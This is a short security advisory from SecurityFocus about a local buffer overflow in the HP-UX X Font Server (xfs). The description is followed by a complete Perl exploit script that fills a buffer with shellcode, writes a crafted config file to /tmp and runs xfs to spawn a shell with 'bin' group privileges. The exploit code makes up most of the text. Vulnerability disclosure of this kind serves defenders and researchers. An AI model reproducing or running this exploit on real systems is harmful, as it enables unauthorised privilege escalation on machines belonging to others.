source: https://www.securityfocus.com/bid/10551/info

HP-UX X Font Server is reportedly affected by a local buffer overflow vulnerability. This issue is due to a failure of the application to properly validate the length of a user-supplied string before copying it into a finite buffer.

This issue may result in corruption of the affected application's memory space. This may be exploited to manipulate the execution flow of the vulnerable application, allowing for the execution of arbitrary machine code with the privileges of the 'bin' group.

#!/usr/contrib/bin/perl
#   Name  : x_hpux_xfs.pl
#   Exploit xfs command of HPUX to get bin gid shell.
# * Usage : perl ./x_hpux_xfs.pl
#   Discovered By watercloud 2003-03-10
#   http://www.xfocus.org (English)
#   http://www.xfocus.net (????)
#   Tested: HPUX B11.0
$BUFF="A";
$BUFF.="\x0b\x39\x02\x99"x58;
$BUFF.="\x41\x41\x41\x41\x7f\x7f\x01\x16\x7f\x7f\x01\x1c\x0b\x39\x02\x99";
$BUFF.="\x0b\x39\x02\x57\x2a\xe4\x97\x10\x28\x3b\x70\xef\x08\x37\x02\x43";
$BUFF.="\xb6\xfa\x40\x04\xb6\xf9\x40\x04\xb6\xf8\x40\x04\xe4\x60\xe0\x08";
$BUFF.="\xb6\xf6\x40\xfe\x0b\x39\x02\x99\x2b\x24\x97\x10\x28\x3b\x70\xef";
$BUFF.="\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22\x0f\x40\x12\x0e";
$BUFF.="\x08\x39\x02\x43\xe4\x60\xe0\x08\xb4\x16\x70\x16/bin/shA";
open(OUTFILE, ">/tmp/.c");
print OUTFILE "error-file=";
print OUTFILE "\x7f\x7f\x01\x10"x500;
close(OUTFILE);
exec("/usr/bin/X11/xfs -config /tmp/.c -port \'$BUFF\'");
#EOF